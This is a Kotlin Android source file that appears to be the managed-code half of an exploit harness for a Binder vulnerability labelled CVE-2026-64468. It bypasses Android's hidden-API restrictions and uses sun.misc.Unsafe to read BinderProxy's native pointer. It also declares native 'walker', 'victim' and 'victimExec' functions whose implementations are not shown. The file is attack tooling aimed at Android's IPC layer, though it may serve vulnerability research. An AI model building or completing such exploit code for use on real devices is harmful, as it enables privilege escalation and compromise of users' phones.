package org.opencrown.binderprobe

import android.os.IBinder
import android.util.Log

/** Reads BinderProxy.mNativeData after exempting the hidden field. */
object BinderNative {
    private val unsafe: Any
    private val fieldOffset: Long

    init {
        org.lsposed.hiddenapibypass.HiddenApiBypass.addHiddenApiExemptions("Landroid/os/BinderProxy;")
        val unsafeClass = Class.forName("sun.misc.Unsafe")
        unsafe = unsafeClass.getDeclaredField("theUnsafe").apply { isAccessible = true }.get(null)
        val field = Class.forName("android.os.BinderProxy").getDeclaredField("mNativeData")
        fieldOffset = unsafeClass.getMethod("objectFieldOffset", java.lang.reflect.Field::class.java)
            .invoke(unsafe, field) as Long
    }

    fun nativeData(binder: IBinder): Long {
        val unsafeClass = unsafe.javaClass
        return unsafeClass.getMethod("getLong", Any::class.java, Long::class.javaPrimitiveType)
            .invoke(unsafe, binder, fieldOffset) as Long
    }
}

/** Native side of the CVE-2026-64468 topology harness. */
object HarnessNative {
    init { System.loadLibrary("binderprobe") }

    external fun handleOf(nativeData: Long): Int
    external fun walkerStart(victimNativeData: Long, threads: Int): Int
    external fun victimChild(walkerNativeData: Long): Int
    external fun closeBinder(): Int
    external fun victimExec(): Int
}
